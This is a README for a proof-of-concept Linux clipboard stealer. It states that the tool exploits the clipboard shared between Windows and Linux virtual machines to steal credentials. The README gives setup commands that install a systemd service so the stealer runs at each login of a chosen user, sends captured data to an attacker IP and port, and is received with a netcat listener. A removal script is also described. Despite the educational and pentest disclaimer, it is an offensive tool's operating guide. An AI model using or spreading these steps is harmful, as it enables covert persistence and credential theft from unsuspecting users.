# clipboard-stealer-poc - EDUCATIONAL PURPOSES ONLY
This is a linux clipboard stealer that takes advantage of shared clipboard between windows and linux virtual machines to steal credentials.
This should only be used during pentests or with permission of the device owner.
# Usage
- `sudo python3 setup.py <user> <path_to_clipboardstealer.py> <path_to_log_file> <attacker_ip> <attacker_port>`
- This sets up the systemd process that runs the clipboardstealer as a certain user every time that user logs in.
- It exfiltrates data to the attacker ip on the specified port; the data can be captured through nc -lvnp \<attacker_port\>.
- `sudo python3 remove.py`
- This removes the systemd process, but, you have to manually clean up the log and stealer file.
